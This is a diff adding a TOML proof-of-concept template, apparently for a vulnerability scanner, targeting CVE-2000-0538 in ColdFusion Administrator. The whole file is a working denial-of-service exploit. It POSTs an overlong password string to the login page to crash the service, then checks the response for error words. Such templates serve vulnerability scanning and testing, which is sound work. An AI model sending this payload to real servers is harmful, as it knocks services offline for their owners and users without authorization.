@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "向 ColdFusion Administrator 登录页面发送超长密码字符串，触发服务进程崩溃导致拒绝服务"
+id = "POC-AVE-2000-0443"
+name = "CVE-2000-0538 ColdFusion Administrator Login Password DoS PoC"
+severity = "medium"
+tags = ["ave-2000-0443"]
+vuln_id = [
+    "CVE-2000-0538",
+    "AVE-2000-0443",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/CFIDE/administrator/index.cfm"
+protocol = "http"
+
+[poc.requests.body]
+content = "password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "Exception",
+    "unavailable",
+    "cannot",
+    "500",
+]
